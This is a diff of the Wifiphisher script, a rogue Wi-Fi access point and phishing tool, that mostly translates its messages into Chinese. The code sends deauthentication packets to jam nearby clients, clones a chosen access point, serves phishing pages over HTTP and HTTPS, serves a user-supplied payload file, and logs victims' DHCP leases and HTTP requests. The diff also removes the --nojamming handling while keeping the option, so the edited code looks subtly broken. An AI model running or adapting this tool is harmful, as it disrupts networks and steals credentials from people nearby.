@@ -21,7 +21,7 @@ import macmatcher
 import interfaces
 from constants import *
 
-VERSION = "1.2GIT"
+VERSION = "1.2"
 conf.verb = 0
 count = 0  # for channel hopping Thread
 APs = {} # for listing APs
@@ -33,7 +33,6 @@ terminate = False
 lock = Lock()
 args = 0
 mon_MAC = 0
-first_pass = 1
 
 def parse_args():
     # Create the arguments
@@ -41,36 +40,34 @@ def parse_args():
     parser.add_argument(
         "-s",
         "--skip",
-        help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA"
+        help="跳过攻击这个 MAC 地址. 例如: -s 00:11:BB:33:44:AA"
     )
     parser.add_argument(
         "-jI",
         "--jamminginterface",
-        help=("Manually choose an interface that supports monitor mode for " +
-              "deauthenticating the victims. " +
-              "Example: -jI wlan1"
+        help=("选择一个支持监听模式的网卡用来攻击受骗者wifi. " +
+              "例如: -jI wlan1"
               )
     )
     parser.add_argument(
         "-aI",
         "--apinterface",
-        help=("Manually choose an interface that supports AP mode for  " +
-              "spawning an AP. " +
-              "Example: -aI wlan0"
+        help=("选择一个网卡来模拟wifi热点. " +
+              "例如: -aI wlan0"
               )
     )
     parser.add_argument(
         "-t",
         "--timeinterval",
-        help=("Choose the time interval between DEAUTH packets being sent")
+        help=("手动设定洪水攻击的时间")
     )
     parser.add_argument(
         "-dP",
         "--deauthpackets",
-        help=("Choose the number of packets to send in each deauth burst. " +
-              "Default value is 1; 1 packet to the client and 1 packet to " +
-              "the AP. Send 2 deauth packets to the client and 2 deauth " +
-              "packets to the AP: -dP 2"
+        help=("指定洪水攻击包的数量. " +
+              "默认为 1; 1 个包发给客户端 1 包发给AP " +
+              "发送2个" +
+              "例如: -dP 2"
               )
     )
     parser.add_argument(
@@ -83,29 +80,28 @@ def parse_args():
     parser.add_argument(
         "-nJ",
         "--nojamming",
-        help=("Skip the deauthentication phase. When this option is used, " +
-              "only one wireless interface is required"
+        help=("跳过洪水攻击，这时只需要一个网卡"
               ),
         action='store_true')
     parser.add_argument(
         "-e",
         "--essid",
-        help=("Enter the ESSID of the rogue Access Point. " +
-             "This option will skip Access Point selection phase. " +
-             "Example: --essid 'Free WiFi'"
+        help=("输入要模拟的wifi热点的名字. " +
+             "这将跳过选择wifi热点" +
+             "例如: --essid 'Free WiFi'"
              )
     )
     parser.add_argument(
         "-p",
         "--phishingscenario",
-        help=("Choose the phishing scenario to run."+
-              "This option will skip the scenario selection phase. " +
-              "Example: -p firmware_upgrade"))
+        help=("选择钓鱼页面，"+
+              "这将跳过选择页面 " +
+              "例如: -p firmware_upgrade"))
     parser.add_argument(
         "-pK",
         "--presharedkey",
-        help=("Add WPA/WPA2 protection on the rogue Access Point. " + 
-              "Example: -pK s3cr3tp4ssw0rd"))
+        help=("为模拟的wifi热点添加 WPA/WPA2 保护 " +
+              "例如: -pK s3cr3tp4ssw0rd"))
 
     return parser.parse_args()
 
@@ -117,15 +113,14 @@ def check_args(args):
     if args.presharedkey and \
     (len(args.presharedkey) < 8 \
     or len(args.presharedkey) > 64):
-        sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
+        sys.exit('[' + R + '-' + W + '] 无线Wi-Fi密码必须 8-63 个字符长度')
 
-    if ((args.jamminginterface and not args.apinterface) or \
-    (not args.jamminginterface and args.apinterface)) and \
-    not (args.nojamming and args.apinterface):
-        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')
+    if (args.jamminginterface and not args.apinterface) or \
+    (not args.jamminginterface and args.apinterface):
+        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) 和 --jamminginterface (-jI) 结合时被占用.')
 
-    if args.nojamming and args.jamminginterface: 
-        sys.exit('[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
+    if args.nojamming and args.jamminginterface:
+        sys.exit('[' + R + '-' + W + '] --nojamming (-nJ) 和 --jamminginterface (-jI) 不能同时运行.')
 
 
 def stopfilter(x):
@@ -161,13 +156,13 @@ def shutdown(template=None, network_manager=None):
         try:
             network_manager.reset_ifaces_to_managed()
         except:
-            print '[' + R + '!' + W + '] Failed to reset interface' 
+            print '[' + R + '!' + W + '] 重置网卡模式失败'
 
     # Remove any template extra files
     if template:
         template.remove_extra_files()
 
-    print '[' + R + '!' + W + '] Closing'
+    print '[' + R + '!' + W + '] 关闭中'
     sys.exit(0)
 
 
@@ -276,8 +271,7 @@ def targeting_cb(pkt):
 def target_APs():
     global APs, count, mac_matcher
     os.system('clear')
-    print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' +
-           ' point from below')
+    print ('[' + G + '+' + W + '] 按下 Ctrl-C 复制wifi热点')
 
     max_name_size = max(map(lambda ap: len(ap[1]), APs.itervalues()))
 
@@ -295,7 +289,7 @@ def target_APs():
 
         print ((G + '{0:2}' + W + ' - {1:2}  - ' +
                T + '{2:{width}} ' + W + ' - ' +
-               B + '{3:17}' + W + ' - {4:12} - ' + 
+               B + '{3:17}' + W + ' - {4:12} - ' +
                R + ' {5:}' + W
             ).format(ap,
                     APs[ap][0],
@@ -312,8 +306,8 @@ def copy_AP():
     while not copy:
         try:
             copy = raw_input(
-                ('\n[' + G + '+' + W + '] Choose the [' + G + 'num' + W +
-                 '] of the AP you wish to copy: ')
+                ('\n[' + G + '+' + W + '] 选择 [' + G + 'num' + W +
+                 '] 一个你想模拟的wifi热点序号: ')
             )
             copy = int(copy)
         except KeyboardInterrupt:
@@ -374,7 +368,7 @@ def select_template(template_argument):
             os.system('clear')
 
             # display template header
-            print "\nAvailable Phishing Scenarios:\n"
+            print "\n可用的钓鱼场景:\n"
 
             # display the templates
             for number in range(len(template_names)):
@@ -383,21 +377,20 @@ def select_template(template_argument):
 
             # get user's choice
             choosen_template = raw_input("\n[" + G + "+" + W +
-                                         "] Choose the [" + G + "num" + W +
-                                         "] of the scenario you wish to use: ")
+                                         "] 选择 [" + G + "num" + W +
+                                         "] 你想使用的钓鱼场景: ")
 
             # placed to avoid a program crash in case of non integer input
             try:
                 template_number = int(choosen_template)
             except ValueError:
-                print "\n[" + R + "-" + W + "] Please input an integer."
+                print "\n[" + R + "-" + W + "] 请输入一个数字."
 
                 # start from the beginning
                 continue
 
             if template_number not in range(1, len(template_names) + 1):
-                print ("\n[" + R + "-" + W + "] Wrong input number! please" +
-                       " try again")
+                print ("\n[" + R + "-" + W + "] 错误的数字，请重试")
 
                 # start from the beginning
                 continue
@@ -410,7 +403,7 @@ def select_template(template_argument):
 
 
 def start_ap(mon_iface, channel, essid, args):
-    print '[' + T + '*' + W + '] Starting the fake access point...'
+    print '[' + T + '*' + W + '] 开始模拟wifi...'
     config = (
         'interface=%s\n'
         'driver=nl80211\n'
@@ -435,9 +428,9 @@ def start_ap(mon_iface, channel, essid, args):
         if hostapd_proc.poll() != None:
             # hostapd will exit on error
             print('[' + R + '+' + W +
-                  '] Failed to start the fake access point! (hostapd error)\n' +
+                  '] 模拟失败! (hostapd error)\n' +
                   '[' + R + '+' + W +
-                  '] Try a different wireless interface using -aI option.'
+                  '] 或许可以换个网卡试试，用命令： -aI .'
                   )
             shutdown()
     except KeyboardInterrupt:
@@ -724,7 +717,7 @@ def mon_mac(mon_iface):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
     mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
-    print ('[' + G + '*' + W + '] Monitor mode: ' + G
+    print ('[' + G + '*' + W + '] 监听模式: ' + G
            + mon_iface + W + ' - ' + O + mac + W)
     return mac
 
@@ -765,7 +758,7 @@ def kill_interfering_procs():
 
 def run():
 
-    print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' % \
+    print ('[' + T + '*' + W + ']  Wifiphisher 启动中 %s at %s' % \
           (VERSION, time.strftime("%Y-%m-%d %H:%M")))
 
     # Parse args
@@ -777,7 +770,7 @@ def run():
 
     # Are you root?
     if os.geteuid():
-        sys.exit('[' + R + '-' + W + '] Please run as root')
+        sys.exit('[' + R + '-' + W + '] 请使用 root')
 
     # TODO: We should have more checks here:
     # Is anything binded to our HTTP(S) ports?
@@ -799,18 +792,15 @@ def run():
             network_manager.set_jam_iface(mon_iface.get_name())
             network_manager.set_ap_iface(ap_iface.get_name())
             # display selected interfaces to the user
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "\
-                   "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "\
-                   "rogue Access Point").format(G, W, mon_iface.get_name(), ap_iface.get_name())
+            print ("[{0}+{1}] 选择 {0}{2}{1} 网卡作为攻击使用 "\
+                   "\n[{0}+{1}] 选择 {0}{3}{1} 网卡作为模拟wifi使用 "\
+                   "").format(G, W, mon_iface.get_name(), ap_iface.get_name())
         else:
-            if args.apinterface:
-                ap_iface = network_manager.get_ap_iface(interface_name=args.apinterface)
-            else:
-                ap_iface = network_manager.get_ap_iface()
+            ap_iface = network_manager.get_ap_iface()
             mon_iface = ap_iface
             network_manager.set_ap_iface(ap_iface.get_name())
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "\
-                   "rogue Access Point").format(G, W, ap_iface.get_name())
+            print ("[{0}+{1}] 选择 {0}{2}{1} 网卡模拟wifi使用 "\
+                   "").format(G, W, ap_iface.get_name())
 
         kill_interfering_procs()
 
@@ -829,7 +819,7 @@ def run():
     set_kernel_var()
     network_manager.up_ifaces([ap_iface, mon_iface])
 
-    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
+    print '[' + T + '*' + W + '] Cleared leases, 启动 DHCP, 设置 iptables'
 
     if args.essid:
         essid = args.essid
@@ -853,8 +843,8 @@ def run():
     # get the correct template
     template = select_template(args.phishingscenario)
 
-    print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
-           " template")
+    print ("[" + G + "+" + W + "] 选择 " + template.get_display_name() +
+           " 模板")
 
     # payload selection for browser plugin update
     if template.has_payload():
@@ -863,11 +853,11 @@ def run():
         while not payload_path or not os.path.isfile(payload_path):
             # get payload path
             payload_path = raw_input("[" + G + "+" + W +
-                                     "] Enter the [" + G + "full path" + W +
-                                     "] to the payload you wish to serve: ")
+                                     "] 输入 [" + G + "全路径" + W +
+                                     "] 你想使用的服务器: ")
             if not os.path.isfile(payload_path):
-                print '[' + R + '-' + W + '] Invalid file path!'
-        print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
+                print '[' + R + '-' + W + '] 路径不可用!'
+        print '[' + T + '*' + W + '] 使用 ' + G + payload_path + W + ' 中 '
         copyfile(payload_path, PHISHING_PAGES_DIR + template.get_payload_path())
 
     APs_context = []
@@ -889,7 +879,7 @@ def run():
         'target_ap_bssid': ap_mac,
         'target_ap_encryption': enctype,
         'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac),
-        'target_ap_logo_path': ap_logo_path 
+        'target_ap_logo_path': ap_logo_path
     })
 
     phishinghttp.serve_template(template)
@@ -902,12 +892,12 @@ def run():
     dhcpconf = dhcp_conf(ap_iface.get_name())
     if not dhcp(dhcpconf, ap_iface.get_name()):
         print('[' + G + '+' + W +
-              '] Could not set IP address on %s!' % ap_iface.get_name()
+              '] 不能设置ip地址 %s!' % ap_iface.get_name()
               )
         shutdown(template)
     os.system('clear')
     print ('[' + T + '*' + W + '] ' + T +
-           essid + W + ' set up on channel ' +
+           essid + W + ' 设置频道 ' +
            T + channel + W + ' via ' + T + mon_iface.get_name() +
            W + ' on ' + T + str(ap_iface.get_name()) + W)
 
@@ -919,11 +909,11 @@ def run():
     except socket.error, v:
         errno = v[0]
         sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
-            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
-            '[' + R + '!' + W + '] Closing'
+            '\n[' + R + '-' + W + '] 不能启动 HTTP 服务 (socket errno ' + str(errno) + ')!\n' +
+            '[' + R + '-' + W + '] 或许另一个进程正在使用端口' + str(PORT) + '?\n' +
+            '[' + R + '!' + W + '] 关闭中...'
         ))
-    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
+    print '[' + T + '*' + W + '] HTTP 服务启动端口： ' + str(PORT)
     webserver = Thread(target=httpd.serve_forever)
     webserver.daemon = True
     webserver.start()
@@ -934,11 +924,11 @@ def run():
     except socket.error, v:
         errno = v[0]
         sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' +
-            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' +
-            '[' + R + '!' + W + '] Closing'
+            '\n[' + R + '-' + W + ']不能开启 HTTPS 服务 (socket errno ' + str(errno) + ')!\n' +
+            '[' + R + '-' + W + '] 或许另一个进程正在使用端口 ' + str(SSL_PORT) + '?\n' +
+            '[' + R + '!' + W + '] 关闭中...'
         ))
-    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
+    print ('[' + T + '*' + W + ']  HTTPS 启动端口 ' +
            str(SSL_PORT))
     secure_webserver = Thread(target=httpd.serve_forever)
     secure_webserver.daemon = True
@@ -954,13 +944,13 @@ def run():
     monitor_on = None
     conf.iface = mon_iface.get_name()
     mon_MAC = mon_mac(mon_iface.get_name())
+    first_pass = 1
 
-    if not args.nojamming:
-        monchannel = channel
-        # Start channel hopping
-        hop = Thread(target=channel_hop2, args=(mon_iface,))
-        hop.daemon = True
-        hop.start()
+    monchannel = channel
+    # Start channel hopping
+    hop = Thread(target=channel_hop2, args=(mon_iface,))
+    hop.daemon = True
+    hop.start()
 
     # Start sniffing
     sniff_thread = Thread(target=sniff_dot11, args=(mon_iface.get_name(),))
@@ -971,21 +961,21 @@ def run():
     try:
         while 1:
             os.system("clear")
-            print "Jamming devices: "
+            print "受干扰的设备: "
             if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                 proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                 lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
             else:
                 lines = "\n" * LINES_OUTPUT
             print lines
-            print "DHCP Leases: "
+            print "DHCP 租约: "
             if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                 proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                 lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
             else:
                 lines = "\n" * LINES_OUTPUT
             print lines
-            print "HTTP requests: "
+            print "HTTP 请求: "
             if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                 proc = check_output(['cat', '/tmp/wifiphisher-webserver.tmp'])
                 lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
